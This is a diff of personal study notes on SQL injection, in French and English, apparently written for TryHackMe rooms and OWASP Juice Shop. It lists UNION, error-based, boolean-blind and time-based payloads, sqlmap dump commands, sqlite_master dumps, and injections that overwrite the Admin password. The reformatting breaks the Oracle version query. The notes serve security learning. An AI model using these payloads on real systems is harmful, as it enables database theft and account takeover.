@@ -1,23 +1,24 @@
-SQL injection
+# SQL injection
 
-Room Burpsuite repeater :
+## Room Burpsuite repeater :
 
-	Dans l'URL // dans la requête using Burp
-	http://10.10.169.81/about/2 -> target
-	Dans burp :
-	on test avec /about/2' -> l'apostrophe est souvent une bonne solution pour trouver une faille
-	dans burp : -> Les 4 null sont pour éviter les erreurs
-	/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
+In this room, the URL looked like http://10.10.169.81/about/2 and the last `2` was vulnerable
 
-	Dans burp :
-	-> pour afficher tous les elements dans 1 seul
-	/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
+### Finding the vulnerability
+`/about/2'` : l'apostrophe est souvent une bonne solution pour trouver une faille  
+L'erreur qui aparait nous montre la vulnerabilité
+### Use the vuln
+```/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"```
 
-	Dans burp :
-	0 UNION ALL SELECT flag,null,null,null,null FROM people WHERE id = 1
+### Display data 
+Pour afficher tous les elements dans 1 seule fois  
+/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
+
+### Find the flag
+/about/0 UNION ALL SELECT flag,null,null,null,null FROM people WHERE id = 1
 
 
-Room Juice shop
+## Room Juice shop
 
 Injection SQL via Login
 On peut utiliser Burp ou directement écrire dans 'email'
@@ -40,13 +41,13 @@ Si on connait une adresse mail
 La présence ou non de mot de passe n'influe QUE sur le bouton 'continuer' qui peut être désactivé si aucun mot de passe n'est rentré.
 
 
-SQLi ROOM THM :
+## SQLi ROOM THM :
 	How to look for SQLi :
 		- Search for IN-BAND SQLi i.e. we can see the output
 		- Search for ERROR-BASED swaping stuff as request parameters to ' or smth
 		- Search for a UNION-BASED SQLi as <normal parameter> UNION 1
 		
-ERROR BASED SQLi
+# ERROR BASED SQLi
 	1st) Look for a proof of concept such as errors displayed on the screen
 	2nd) Add parameters after the union as much as needed to avoid error 
 		and change the very first param so it return nothing
@@ -68,7 +69,7 @@ ERROR BASED SQLi
 		The first ' close the string, the or 1=1 return True, ';' is used to specify the end
 		ans -- to delete following compares
 		
-BOOLEAN BASED BLIND SQLi
+# BOOLEAN BASED BLIND SQLi
 		In this case, we expect a boolean that says if the request is correct or not
 		(True/False; 0/1 ; yes/no ; ...)
 		On doit donc chercher d'abord un booleen qui nous est retournée si la requête est valide.
@@ -98,58 +99,52 @@ BOOLEAN BASED BLIND SQLi
 	FIND ATTRIBUTE VALUES
 		admin123' UNION SELECT 1,2,3 from users where username like 'a%
 	
-TIME BASED SQLi (this is when nothing show the request being wrong or right so if the request come back after a given time, it worked)
+# TIME BASED SQLi 
+(this is when nothing show the request being wrong or right so if the request come back after a given time, it worked)
 	
-	1st) Try
-	admin123' UNION SELECT SLEEP(5);-- 		Since this not worked
-	2nd) Add attributs
-	admin123' UNION SELECT SLEEP(5),2;--		until it works
-	3rd) Start the boolean based process 
+1. Try ```admin123' UNION SELECT SLEEP(5);-- -```  	
+Since this not worked
+2. Add attributs until it works
+```admin123' UNION SELECT SLEEP(5),2;--```		
+3. Start the boolean based process 
 	
 		
 	
-TOOLS :
+## TOOLS :
 sqlmap
 need to capture a request with burp and put it in request.txt
 sqlmap -r request.txt --dbms-mysql --dump
 
 
-IDENTIFY VERSIONS :
-# MySQL and MSSQL
+## IDENTIFY VERSIONS :
+- MySQL and MSSQL
 ',nickName=@@version,email='
-# For Oracle
-',nickName=(SELECT banner FROM v$version),email='
-# For SQLite
+- For Oracle
+',nickName=(SELECT banner FROM $version),email='
+- For SQLite
 ',nickName=sqlite_version(),email='
 
-MASTER DATABASE
-# MySQL and MSSQL
+## MASTER DATABASE
+- MySQL and MSSQL
 information_schema.tables 	table_schema		table_name
-# For Oracle
+- For Oracle
 ?
-# For SQLite
+- For SQLite
 sqlite_master						tbl_name	sql
 
 
 nickName=',nickName=(SELECT GROUP_CONCAT(*) FROM sqlite_master),email='&email=email&password='
 nickName=',nickName=SELECT * FROM sqlite_master,email='&email=email&password=
 nickName=',nickName=sqlite_version(),email='&email=email&password=
-
 DUMP TABLE NAMES
 nickName=',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master),email='&email=email&password=
-
 DUMP COLUMN NAMES
 nickName=',nickName=(SELECT group_concat(sql) FROM sqlite_master WHERE name='usertable'),email='&email=email&password=
-
 DUMP DATA
 nickName=',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") FROM usertable),email='&email=email&password=
 DUMP DATA2
 nickName=',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") FROM secrets),email='&email=email&password=
-
-
-
 nickName=Admin&email=&password=5dfac5ccc654a3474438474b85a4cfcc21c5239af327dffa02a0a27fbc7ca2a4' WHERE name='Admin';-- -
-
 nickName=Admin', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -
 
 SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable
